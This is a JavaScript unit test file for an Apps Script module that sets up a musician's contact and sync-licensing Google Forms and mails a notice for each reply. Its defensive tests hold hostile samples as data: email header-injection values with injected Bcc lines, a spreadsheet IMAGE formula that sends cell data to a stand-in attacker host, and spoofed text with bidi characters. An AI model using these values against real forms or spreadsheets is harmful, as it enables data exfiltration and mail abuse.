// FormsSetup.gs: setupDanyelOzForms (idempotent, guards, printed forms.json) and fsOnFormSubmit (FR-01..FR-10 of
// runs/r-20261121-1848-own-forms/security/design-review.md). Usage: node tests/unit/test_formssetup.js apps-script
const fs = require('fs'), vm = require('vm'), path = require('path'), assert = require('assert');
const eq = (a, b, m) => assert.strictEqual(JSON.stringify(a), JSON.stringify(b), (m || 'mismatch') + ': ' + JSON.stringify(a));
const DIR = process.argv[2] || 'apps-script';
const SRC = fs.readFileSync(path.join(DIR, 'FormsSetup.gs'), 'utf8');

/* ---------- mocks ---------- */
let seq = 0, formsCreated = 0, itemsAdded = 0, booksCreated = 0, mails = [], logs = [], cellWrites = [];
let today = '2026-11-21', quota = 100;
const forms = {}, books = {}, broken = new Set(), props = {}, triggers = [];
const ItemType = { TEXT: 'TEXT', PARAGRAPH_TEXT: 'PARAGRAPH_TEXT', MULTIPLE_CHOICE: 'MULTIPLE_CHOICE' };
function makeItem(type) {
  const it = { id: 1000 + (++seq), type, title: '', required: false, help: '', choices: [], other: false,
    getId() { return this.id; }, getType() { return this.type; }, getTitle() { return this.title; }, setTitle(t) { this.title = t; return this; },
    isRequired() { return this.required; }, setRequired(r) { this.required = r; return this; },
    getHelpText() { return this.help; }, setHelpText(h) { this.help = h; return this; },
    getChoices() { return this.choices.map(v => ({ getValue: () => v })); }, setChoiceValues(c) { this.choices = c.slice(); return this; },
    hasOtherOption() { return this.other; }, showOtherOption(o) { this.other = o; return this; },
    createResponse(v) { assert.ok(typeof v === 'string' && v.length, 'sample answer'); if (this.type === 'MULTIPLE_CHOICE') assert.ok(this.choices.includes(v)); return { item: this, v }; } };
  it.asTextItem = () => { assert.strictEqual(it.type, 'TEXT'); return it; };
  it.asParagraphTextItem = () => { assert.strictEqual(it.type, 'PARAGRAPH_TEXT'); return it; };
  it.asMultipleChoiceItem = () => { assert.strictEqual(it.type, 'MULTIPLE_CHOICE'); return it; };
  return it;
}
function makeForm(title) {
  const id = 'FORMEDIT' + (++seq) + 'abcdefghijklmnop', pub = '1FAIpQLSf' + (seq) + 'PUBLISHEDidXXXXXXXXXXXXXXXXXXXXXX';
  const f = { id, pub, title, items: [], dest: null, s: { collect: false, edit: false, limit: false, summary: false, again: true, accepting: true, confirm: '' },
    getId() { return id; }, getTitle() { return this.title; }, getItems() { return this.items.slice(); },
    getItemById(i) { return this.items.find(x => String(x.id) === String(i)) || null; },
    addTextItem() { itemsAdded++; const x = makeItem('TEXT'); this.items.push(x); return x; },
    addParagraphTextItem() { itemsAdded++; const x = makeItem('PARAGRAPH_TEXT'); this.items.push(x); return x; },
    addMultipleChoiceItem() { itemsAdded++; const x = makeItem('MULTIPLE_CHOICE'); this.items.push(x); return x; },
    collectsEmail() { return this.s.collect; }, setCollectEmail(v) { this.s.collect = v; return this; },
    canEditResponse() { return this.s.edit; }, setAllowResponseEdits(v) { this.s.edit = v; return this; },
    hasLimitOneResponsePerUser() { return this.s.limit; }, setLimitOneResponsePerUser(v) { this.s.limit = v; return this; },
    isPublishingSummary() { return this.s.summary; }, setPublishingSummary(v) { this.s.summary = v; return this; },
    hasRespondAgainLink() { return this.s.again; }, setShowLinkToRespondAgain(v) { this.s.again = v; return this; },
    isAcceptingResponses() { return this.s.accepting; }, setAcceptingResponses(v) { this.s.accepting = v; return this; },
    getConfirmationMessage() { return this.s.confirm; }, setConfirmationMessage(v) { this.s.confirm = v; return this; },
    setRequireLogin() { throw new Error('consumer account'); },
    getDestinationId() { if (!this.dest) throw new Error('no destination'); return this.dest; },
    setDestination(t, d) { assert.strictEqual(t, 'SPREADSHEET'); this.dest = d; if (books[d]) books[d].addFormSheet(this); return this; },
    getPublishedUrl() { return 'https://docs.google.com/forms/d/e/' + pub + '/viewform'; },
    createResponse() { const got = []; return { withItemResponse(r) { got.push(r); return this; },
      toPrefilledUrl() { return 'https://docs.google.com/forms/d/e/' + pub + '/viewform?usp=pp_url' + got.map(r => '&entry.' + (r.item.id * 7919) + '=' + encodeURIComponent(r.v)).join(''); } }; } };
  return f;
}
function makeBook(name) {
  const id = 'BOOK' + (++seq) + 'xxxxxxxxxxxxxxxxxxxx';
  const b = { id, name, sheets: [], getId() { return id; }, getUrl() { return 'https://docs.google.com/spreadsheets/d/' + id + '/edit'; },
    getEditors() { return []; }, getViewers() { return []; },
    addFormSheet(form) { if (this.sheets.some(s => s.formId === form.id)) return; const s = makeSheet(this, form); this.sheets.push(s); } };
  books[id] = b; return b;
}
function makeSheet(book, form) {
  return { formId: form.id, book, rows: [['Timestamp'].concat(form.items.map(i => i.title))], getParent() { return book; },
    getFormUrl() { return 'https://docs.google.com/forms/d/' + form.id + '/edit'; },
    getRange(r, c, nr, nc) { const sh = this; return { getValues: () => [sh.rows[r - 1].slice(c - 1, c - 1 + nc)] }; } };
}
// e.range for a new reply row: cells are {v, f} (display value, formula)
function makeEvent(sheet, cells) {
  const row = cells.map(x => (x && typeof x === 'object' && 'f' in x) ? x : { v: x, f: '' });
  const range = { getSheet: () => sheet, getColumn: () => 1, getValues: () => [row.map(x => x.v)], getFormulas: () => [row.map(x => x.f)],
    getCell: (r, c) => ({ setValue(v) { assert.strictEqual(r, 1); cellWrites.push([c, v]); row[c - 1] = { v: String(v).replace(/^'/, ''), f: '' }; } }) };
  return { range, row };
}
const songDb = { getId: () => 'SONGDB_ID' };
let active = songDb;
const ctx = vm.createContext({
  JSON, Date, Number, String, Object, Array, Error,
  FormApp: { ItemType, DestinationType: { SPREADSHEET: 'SPREADSHEET' },
    create: t => { formsCreated++; const f = makeForm(t); forms[f.id] = f; return f; },
    openById: id => { if (broken.has(id) || !forms[id]) throw new Error('No item with the given ID could be found.'); return forms[id]; },
    openByUrl: u => { const m = /\/forms\/d\/([^/]+)/.exec(u); if (!m || !forms[m[1]]) throw new Error('bad url'); return forms[m[1]]; } },
  SpreadsheetApp: { getActiveSpreadsheet: () => active, create: n => { booksCreated++; return makeBook(n); },
    openById: id => { if (!books[id]) throw new Error('missing'); return books[id]; } },
  ScriptApp: { getProjectTriggers: () => triggers.slice(), deleteTrigger: t => { triggers.splice(triggers.indexOf(t), 1); },
    newTrigger: fn => ({ forSpreadsheet: src => ({ onFormSubmit: () => ({ create: () => { const id = typeof src === 'string' ? src : src.getId();
      const t = { getHandlerFunction: () => fn, getTriggerSourceId: () => id, getEventType: () => 'ON_FORM_SUBMIT' }; triggers.push(t); return t; } }) }) }) },
  MailApp: { getRemainingDailyQuota: () => quota, sendEmail: m => { assert.strictEqual(typeof m, 'object', 'object form only'); mails.push(m); } },
  PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null), setProperty: (k, v) => { props[k] = String(v); },
    getKeys: () => Object.keys(props), deleteProperty: k => { delete props[k]; } }) },
  LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
  Logger: { log: s => logs.push(String(s)) },
  Utilities: { formatDate: (d, tz, f) => { assert.strictEqual(tz, 'Asia/Manila'); return f === 'yyyy-MM-dd' ? today : today + ' 10:00'; } }
});
vm.runInContext(SRC, ctx, { filename: 'FormsSetup.gs' });
const G = n => vm.runInContext(n, ctx);
const FS_FORMS = JSON.parse(JSON.stringify(G('FS_FORMS')));

/* ---------- field spec equals plan.md section 4 ---------- */
const spec = k => FS_FORMS[k].fields.map(f => [f.key, f.label, f.type, f.required, f.max || null, f.help || null, f.choices || null]);
eq(spec('contact'), [
  ['first_name', 'First name', 'text', true, 60, null, null], ['last_name', 'Last name', 'text', true, 60, null, null],
  ['email', 'Email', 'email', true, 254, null, null],
  ['topic', 'What would you like to contact me about?', 'choice', true, null, null, ['Fan Contact', 'Music Collaborations',
    'Beat Licensing & Instrumentals', 'Sync & Licensing', 'Media & Business Inquiries', 'General Inquiries']],
  ['subject', 'Subject', 'text', true, 120, null, null], ['message', 'Message', 'long', true, 4000, 'Tell me how I can help.', null]], 'contact spec');
eq(spec('sync'), [
  ['name', 'Name', 'text', true, 120, null, null], ['email', 'Email', 'email', true, 254, null, null],
  ['company', 'Company or production', 'text', true, 120, null, null], ['songs', 'Song or songs', 'text', true, 500, null, null],
  ['project', 'Project', 'long', true, 1500, 'Title and a short description of the scene or use.', null],
  ['media', 'Media type', 'choice', true, null, null, ['Film', 'TV or streaming series', 'Advertising or commercial', 'Trailer or promo',
    'Video game', 'Online video or social media', 'Podcast', 'Corporate or event', 'Other']],
  ['territory', 'Territory', 'text', true, 120, 'For example: Worldwide, or US only.', null],
  ['term', 'Term', 'text', true, 120, 'For example: 1 year, or perpetual.', null],
  ['timeline', 'Timeline', 'text', true, 120, 'When you need the license.', null],
  ['budget', 'Budget range', 'choice', false, null, null, ['Under $500', '$500 to $2,000', '$2,000 to $10,000', 'Over $10,000', 'Not sure yet']],
  ['notes', 'Notes', 'long', false, 2000, null, null]], 'sync spec');
eq([FS_FORMS.contact.title, FS_FORMS.sync.title, G('FS_NOTIFY'), G('FS_INBOX_NAME'), G('FS_EMAIL_RE').source],
  ['Danyel OZ contact', 'Sync license request', 'daniel.vizkaino@gmail.com', 'Danyel OZ Inbox (private)',
    /^[A-Za-z0-9._+-]+@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}$/.source]);
const syncSrc = fs.readFileSync(path.join(DIR, 'Sync.gs'), 'utf8');
assert.ok(syncSrc.includes(G('FS_EMAIL_RE').toString()), 'email regex identical to SY_EMAIL_RE (N-1)');

/* ---------- guard: stored inbox equal to the Song Database ---------- */
props.FS_INBOX_SHEET_ID = 'SONGDB_ID';
assert.throws(() => ctx.setupDanyelOzForms(), /Inbox must not be the Song Database/);
eq([formsCreated, booksCreated, triggers.length], [0, 0, 0], 'nothing created when the guard trips');
delete props.FS_INBOX_SHEET_ID;

/* ---------- first run ---------- */
function validConfig(c) {
  eq(Object.keys(c), ['version', 'forms']); eq(c.version, 1); eq(Object.keys(c.forms), ['contact', 'sync']);
  for (const k of ['contact', 'sync']) {
    assert.ok(/^https:\/\/docs\.google\.com\/forms\/d\/e\/[A-Za-z0-9_-]{20,}\/formResponse$/.test(c.forms[k].action), k + ' action');
    eq(Object.keys(c.forms[k].fields), FS_FORMS[k].fields.map(f => f.key), k + ' field keys');
    const vals = Object.values(c.forms[k].fields);
    vals.forEach(v => assert.ok(/^entry\.[0-9]{4,12}$/.test(v), k + ' entry ' + v));
    eq(new Set(vals).size, vals.length, k + ' distinct entries');
  }
  assert.ok(!JSON.stringify(c).includes('spreadsheets'), 'no inbox URL in the config');
}
function printed() {
  const a = logs.lastIndexOf('FORMS_JSON_BEGIN'), b = logs.lastIndexOf('FORMS_JSON_END');
  assert.ok(a >= 0 && b === a + 2, 'markers'); return { json: JSON.parse(logs[a + 1]), after: logs.slice(b + 1).join('\n'), inside: logs[a + 1] };
}
logs = [];
const cfg1 = JSON.parse(JSON.stringify(ctx.setupDanyelOzForms()));
validConfig(cfg1);
const out1 = printed();
eq(out1.json, cfg1, 'printed JSON equals the returned config');
assert.ok(out1.after.includes('https://docs.google.com/spreadsheets/d/'), 'inbox URL logged outside the markers');
assert.ok(!out1.inside.includes('spreadsheets'), 'inbox URL not inside the markers');
eq([formsCreated, booksCreated, triggers.length, itemsAdded], [2, 1, 1, 17], 'first run: 2 forms, 1 inbox, 1 inbox trigger, 17 items');
const inbox = Object.values(books)[0];
eq(inbox.name, 'Danyel OZ Inbox (private)');
const fC = forms[props.FS_CONTACT_FORM_ID], fS = forms[props.FS_SYNC_FORM_ID];
eq([fC.title, fS.title, fC.dest, fS.dest], ['Danyel OZ contact', 'Sync license request', inbox.id, inbox.id], 'both destinations = inbox');
eq(props.FS_SONG_DB_ID, 'SONGDB_ID', 'setup stores the container id for the trigger guard (FI-1)');
eq([triggers[0].getHandlerFunction(), triggers[0].getTriggerSourceId()], ['fsOnFormSubmit', inbox.id], 'trigger on the inbox spreadsheet (D-7)');
eq(fC.s, { collect: false, edit: false, limit: false, summary: false, again: false, accepting: true, confirm: 'Thank you. Your message is sent.' });
eq(fC.items.map(i => [i.title, i.type, i.required, i.help, i.choices.length]), FS_FORMS.contact.fields.map(f =>
  [f.label, f.type === 'long' ? 'PARAGRAPH_TEXT' : f.type === 'choice' ? 'MULTIPLE_CHOICE' : 'TEXT', f.required, f.help || '', (f.choices || []).length]), 'contact items');
eq(fS.items.find(i => i.title === 'Budget range').required, false);
eq(cfg1.forms.contact.fields.first_name, 'entry.' + fC.items[0].id * 7919, 'entry id from the prefilled URL of that item');
eq(cfg1.forms.sync.action, 'https://docs.google.com/forms/d/e/' + fS.pub + '/formResponse');
assert.ok(!logs.some(l => /corrected/.test(l)), 'new forms log no corrections');

/* ---------- second run: nothing new ---------- */
logs = [];
const cfg2 = JSON.parse(JSON.stringify(ctx.setupDanyelOzForms()));
eq(cfg2, cfg1, 'same config');
eq([formsCreated, booksCreated, triggers.length, itemsAdded], [2, 1, 1, 17], 'second run creates nothing');
assert.ok(!logs.some(l => /corrected|created|installed/.test(l)), 'second run changes nothing');

/* ---------- repair (FR-07a): drifted settings, foreign destination, renamed item ---------- */
fS.s.summary = true; fS.dest = 'SOMEONE_ELSES_SHEET'; fS.items[0].title = 'Your name';
logs = [];
eq(JSON.parse(JSON.stringify(ctx.setupDanyelOzForms())), cfg1, 'repair keeps the entry ids');
eq([fS.s.summary, fS.dest, fS.items[0].title, itemsAdded], [false, inbox.id, 'Name', 17], 'repaired by item id, no new item');
eq(logs.filter(l => /corrected/.test(l)), ['fs setup: sync corrected publishing summary', 'fs setup: sync corrected name title',
  'fs setup: sync corrected destination'], 'each correction logged by setting name');

/* ---------- a stored form id that throws is recreated ---------- */
broken.add(fC.id);
const cfg3 = JSON.parse(JSON.stringify(ctx.setupDanyelOzForms()));
validConfig(cfg3);
eq([formsCreated, booksCreated, triggers.length, itemsAdded], [3, 1, 1, 23], 'only the broken contact form is recreated');
assert.notStrictEqual(props.FS_CONTACT_FORM_ID, fC.id); eq(cfg3.forms.sync, cfg1.forms.sync);
const fC2 = forms[props.FS_CONTACT_FORM_ID];

/* ---------- old triggers of this handler are replaced by one on the inbox ---------- */
triggers.length = 0; triggers.push({ getHandlerFunction: () => 'fsOnFormSubmit', getTriggerSourceId: () => fS.id }, { getHandlerFunction: () => 'ttAutoPost', getTriggerSourceId: () => 'x' });
ctx.setupDanyelOzForms();
eq(triggers.map(t => [t.getHandlerFunction(), t.getTriggerSourceId()]), [['ttAutoPost', 'x'], ['fsOnFormSubmit', inbox.id]], 'trigger repair');

/* ---------- guard: a form that sends replies to the Song Database ---------- */
fS.dest = 'SONGDB_ID';
const fc = formsCreated;
assert.throws(() => ctx.setupDanyelOzForms(), /Song Database/);
eq([fS.dest, formsCreated], ['SONGDB_ID', fc], 'not silently relinked');
fS.dest = inbox.id;


/* ---------- fsOnFormSubmit ---------- */
const sheetC = inbox.sheets.find(s => s.formId === fC2.id), sheetS = inbox.sheets.find(s => s.formId === fS.id);
assert.ok(sheetC && sheetS, 'one sheet per form in the inbox');
const NOW = 'TS';
const contactRow = o => { const v = Object.assign({ first_name: 'Ana', last_name: 'Cruz', email: 'ana@example.com', topic: 'Fan Contact', subject: 'Hello', message: 'Line one\nLine two' }, o);
  return [NOW].concat(FS_FORMS.contact.fields.map(f => v[f.key])); };
const syncRow = o => { const v = Object.assign({ name: 'Bo Lee', email: 'bo@studio.tv', company: 'Studio Nine', songs: 'Today', project: 'Short film\nEnd scene', media: 'Film',
  territory: 'Worldwide', term: '1 year', timeline: 'March', budget: '', notes: '' }, o);
  return [NOW].concat(FS_FORMS.sync.fields.map(f => v[f.key])); };
const submit = (sheet, cells) => { const ev = makeEvent(sheet, cells); const n = mails.length; ctx.fsOnFormSubmit(ev); return { ev, sent: mails.slice(n) }; };
const reset = () => { Object.keys(props).filter(k => k.startsWith('FS_MAIL_COUNT_')).forEach(k => delete props[k]); mails = []; logs = []; cellWrites = []; quota = 100; };
const checkMail = m => { eq(m.to, 'daniel.vizkaino@gmail.com', 'to is FS_NOTIFY');
  ['cc', 'bcc', 'htmlBody', 'attachments'].forEach(k => assert.ok(!(k in m), 'no ' + k));
  assert.ok(!/[\r\n]/.test(m.subject) && m.subject.length <= 150, 'subject one line, <= 150');
  assert.ok(!m.body.includes('docs.google.com/spreadsheets'), 'no inbox URL in the mail (FR-05)'); eq(m.name, 'Danyel OZ website'); };

reset();
let r = submit(sheetC, contactRow());
eq(r.sent.length, 1); checkMail(r.sent[0]);
eq(r.sent[0].replyTo, 'ana@example.com');
eq(r.sent[0].subject, 'Website message: Fan Contact | Hello');
eq(r.sent[0].body.split('\n'), ['New message from the Danyel OZ contact form', 'Sent: 2026-11-21 10:00 Manila time', 'Reply-To set: yes',
  'Reply to this email to answer.', '', '---- Message as sent (unverified) ----', '  | First name: Ana', '  | Last name: Cruz',
  '  | Email: ana@example.com', '  | What would you like to contact me about?: Fan Contact', '  | Subject: Hello', '  | Message:',
  '  |     Line one', '  |     Line two'], 'contact body');
eq(cellWrites, [], 'plain answers are not rewritten');

r = submit(sheetS, syncRow());
eq(r.sent.length, 1); checkMail(r.sent[0]);
eq(r.sent[0].subject, 'Sync license request: Today | Studio Nine');
assert.ok(r.sent[0].body.includes('  | Budget range: (none)\n  | Notes:\n  |     (none)'), 'optional empty shows (none)');
assert.ok(r.sent[0].body.startsWith('New sync license request\n'));

// FR-02: hostile values
const HOSTILE = 'All replies: https://evil.example/x\nReply to this email to answer.\nSent: fake';
r = submit(sheetC, contactRow({ topic: 'Beat Licensing & Instrumentals', subject: 'Hi\u202Ethere\u200B ' + 'x'.repeat(110), message: HOSTILE }));
eq(r.sent.length, 1); checkMail(r.sent[0]);
const body = r.sent[0].body, sep = body.indexOf('---- Message as sent (unverified) ----');
assert.ok(!/[\u202E\u200B]/.test(body + r.sent[0].subject), 'bidi and zero-width stripped');
body.split('\n').forEach((l, i, a) => { if (/evil|Sent: fake/.test(l)) assert.ok(l.startsWith('  | ') && body.indexOf(l) > sep, 'user line quoted after the separator'); });
eq(body.split('\n').filter(l => l === 'Reply to this email to answer.').length, 1, 'only the trusted line sits at column 0');
eq(r.sent[0].subject.length, 150);

// invalid replies: no mail, row kept
reset();
const invalid = [
  ['email with CRLF Bcc', { email: 'a@b.com\r\nBcc: x@evil.io' }], ['email with LF Bcc', { email: 'a@b.com\nBcc: x' }], ['empty email', { email: '' }],
  ['quoted local part', { email: '"a b"<x@evil.io>@b.com' }], ['percent at-sign', { email: 'a%40b@c.com' }], ['angle brackets', { email: '<a@b.com>' }],
  ['choice with newline', { topic: 'Fan Contact\nX' }], ['unknown choice', { topic: 'Spam' }], ['oversize subject', { subject: 'x'.repeat(121) }],
  ['oversize message', { message: 'y'.repeat(4001) }], ['required empty', { first_name: '  ' }], ['only zero-width', { last_name: '\u200B\u200B' }]];
invalid.forEach(([name, o]) => { eq(submit(sheetC, contactRow(o)).sent.length, 0, name + ' sends nothing'); });
eq(submit(sheetS, syncRow({ budget: 'A million' })).sent.length, 0, 'unknown budget choice');
eq(Object.keys(props).filter(k => k.startsWith('FS_MAIL_COUNT_')).map(k => props[k]), [], 'invalid replies do not count');
assert.ok(!logs.some(l => /evil|Bcc|Spam|xxxxx/.test(l)), 'no answer text in the logs (FR-10)');

// FR-03: formula cells rewritten as text
reset();
r = submit(sheetS, syncRow({ company: { v: '#ERROR!', f: '=IMAGE("https://evil.example/?"&A2)' }, territory: '+63 912', term: ' =1+1', timeline: '@x', notes: '-' }));
const col = k => 2 + FS_FORMS.sync.fields.findIndex(f => f.key === k);
eq(cellWrites, [[col('company'), '\'=IMAGE("https://evil.example/?"&A2)'], [col('territory'), "'+63 912"], [col('term'), "' =1+1"], [col('timeline'), "'@x"], [col('notes'), "'-"]], 'formula-looking cells rewritten');
eq(r.sent.length, 1, 'still mailed'); assert.ok(r.sent[0].body.includes('  | Company or production: =IMAGE('), 'mail shows the typed text');

// FR-07b: a renamed question still lands in the mail; an extra column shows as Other answer
reset();
const renamed = sheetS.rows[0].slice(); const iName = renamed.indexOf('Name');
fS.items.find(i => i.title === 'Name').title = 'Full name'; sheetS.rows[0][iName] = 'Full name'; sheetS.rows[0].push('Extra question');
r = submit(sheetS, syncRow().concat(['planted extra']));
eq(r.sent.length, 1); assert.ok(r.sent[0].body.includes('  | Name: Bo Lee'), 'matched by stored item id');
assert.ok(r.sent[0].body.includes('  | Other answer (Extra question):\n  |     planted extra'), 'unknown column kept');
sheetS.rows[0] = renamed; fS.items.find(i => i.title === 'Full name').title = 'Name';

// unknown form, wrong book, inbox guard, fake events (FR-06, FR-09)
reset();
const otherForm = makeForm('Someone else'); forms[otherForm.id] = otherForm;
eq(submit(makeSheet(inbox, otherForm), [NOW, 'a']).sent.length, 0, 'unknown form sends nothing');
const otherBook = makeBook('Other'); r = submit(makeSheet(otherBook, fS), syncRow({ term: '=2' }));
eq([r.sent.length, cellWrites], [0, []], 'reply in another book: cells untouched, no mail (D-1)');
// FI-1: the trigger guard uses the stored FS_SONG_DB_ID, never getActiveSpreadsheet()
reset(); active = inbox;
r = submit(sheetS, syncRow({ term: '=3' }));
eq([r.sent.length, cellWrites], [1, [[col('term'), "'=3"]]], 'active spreadsheet = inbox during the trigger: neutralized and mailed');
active = songDb;
reset(); props.FS_INBOX_SHEET_ID = 'SONGDB_ID';
const sdb = makeBook('fake'); sdb.getId = () => 'SONGDB_ID';
r = submit(makeSheet(sdb, fS), syncRow({ territory: '=1' }));
eq([r.sent.length, cellWrites], [0, []], 'event spreadsheet is the Song Database: cells untouched, no mail (D-1)');
props.FS_INBOX_SHEET_ID = inbox.id; r = submit(makeSheet(sdb, fS), syncRow({ territory: '=1' }));
eq([r.sent.length, cellWrites], [0, []], 'Song Database event with the right inbox id stored: untouched, no mail');
delete props.FS_INBOX_SHEET_ID; r = submit(sheetS, syncRow({ territory: '=1' }));
eq([r.sent.length, cellWrites], [0, []], 'inbox id missing: untouched, no mail');
assert.ok(logs.includes('fsOnFormSubmit: inbox guard'));
props.FS_INBOX_SHEET_ID = inbox.id;
reset(); const savedDb = props.FS_SONG_DB_ID; delete props.FS_SONG_DB_ID;
r = submit(sheetS, syncRow({ notes: '+1' }));
eq([r.sent.length, cellWrites], [0, [[col('notes'), "'+1"]]], 'FS_SONG_DB_ID missing: neutralized, no mail (fail safe)');
assert.ok(logs.some(l => /Song Database id missing/.test(l)));
props.FS_SONG_DB_ID = savedDb; reset();
[undefined, null, {}, { source: {} }, { range: {} }, { range: { getSheet: 'x' } }, JSON.parse(JSON.stringify({ source: { id: fS.id }, range: { sheet: sheetS.formId } }))]
  .forEach((e, i) => { assert.doesNotThrow(() => ctx.fsOnFormSubmit(e)); });
eq([mails.length, cellWrites.length], [0, 0], 'fake events: no mail, no writes');

// FR-01: daily cap, notice, rollover, quota floor
reset();
for (let i = 0; i < 41; i++) submit(sheetC, contactRow());
eq(mails.length, 41); eq(mails.slice(0, 40).every(m => m.subject === 'Website message: Fan Contact | Hello'), true);
eq([mails[40].subject, mails[40].body, 'replyTo' in mails[40]], ['Danyel OZ website: daily email limit reached',
  'Daily email limit reached; new replies are still saved in the inbox.', false], '41st: one cap notice'); checkMail(mails[40]);
eq(submit(sheetC, contactRow()).sent.length, 0, '42nd: nothing');
today = '2026-11-22';
eq(submit(sheetC, contactRow()).sent.length, 1, 'next Manila day: mails again');
eq(Object.keys(props).filter(k => k.startsWith('FS_MAIL_COUNT_')), ['FS_MAIL_COUNT_2026-11-22'], 'old day key deleted');
quota = 3; eq(submit(sheetC, contactRow()).sent.length, 0, 'quota under 5: nothing'); quota = 100;

// FR-10: MailApp failure logs a fixed message, no values
reset();
const realSend = ctx.MailApp.sendEmail; ctx.MailApp.sendEmail = () => { throw new Error('send failed for PLANTED_MARKER'); };
assert.doesNotThrow(() => submit(sheetC, contactRow({ subject: 'PLANTED_MARKER' })));
ctx.MailApp.sendEmail = realSend;
assert.ok(logs.length && !logs.join('\n').includes('PLANTED_MARKER'), 'no marker in logs');
eq(logs, ['fsOnFormSubmit: could not finish for form contact']);
eq(Object.values(props).filter((v, i) => Object.keys(props)[i].startsWith('FS_MAIL_COUNT_')), [], 'failed send not counted');

/* ---------- source checks (FR-02f, FR-06c, FR-10, FR-14) ---------- */
const code = SRC.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
eq((code.match(/MailApp\.sendEmail/g) || []).length, 1, 'one sendEmail call site');
eq((code.match(/newTrigger/g) || []).length, 1, 'one newTrigger call site');
['addEditor', 'addViewer', 'setSharing', 'DriveApp', 'GmailApp', 'UrlFetchApp', 'console.', 'htmlBody', 'cc:', 'bcc'].forEach(w => assert.ok(!code.includes(w), 'no ' + w));
assert.ok(!/@(?!example)[a-z0-9-]+\.[a-z]/i.test(code.replace(/daniel\.vizkaino@gmail\.com/g, '').replace(/FS_EMAIL_RE = [^\n]+/, '')), 'only daniel.vizkaino@gmail.com');

// ---------- names: FormsSetup adds only fs* and FS_* names plus setupDanyelOzForms; no clash across all .gs ----------
const topNames = src => (src.match(/^(?:function\s+([A-Za-z_$][\w$]*)|(?:const|let|var)\s+([A-Za-z_$][\w$]*))/gm) || []).map(s => s.split(/\s+/)[1].replace(/\(.*/, ''));
const mine = topNames(SRC);
assert.ok(mine.length > 10);
mine.forEach(n => assert.ok(/^(fs[A-Z]\w*|FS_[A-Z0-9_]+|setupDanyelOzForms)$/.test(n), 'name ' + n));
const all = {};
const files = fs.readdirSync(DIR).filter(f => f.endsWith('.gs')).map(f => path.join(DIR, f))
  .concat(fs.existsSync(path.join(DIR, '..', 'tools')) ? fs.readdirSync(path.join(DIR, '..', 'tools')).filter(f => f.endsWith('.gs')).map(f => path.join(DIR, '..', 'tools', f)) : []);
files.forEach(f => topNames(fs.readFileSync(f, 'utf8')).forEach(n => { assert.ok(!all[n], 'duplicate top-level name ' + n + ' in ' + f + ' and ' + all[n]); all[n] = f; }));
const one = vm.createContext({});
fs.readdirSync(DIR).filter(f => f.endsWith('.gs')).forEach(f => vm.runInContext(fs.readFileSync(path.join(DIR, f), 'utf8'), one, { filename: f }));
assert.strictEqual(typeof vm.runInContext('setupDanyelOzForms', one), 'function');

console.log('test_formssetup: ' + files.length + ' .gs files checked; PASSED');
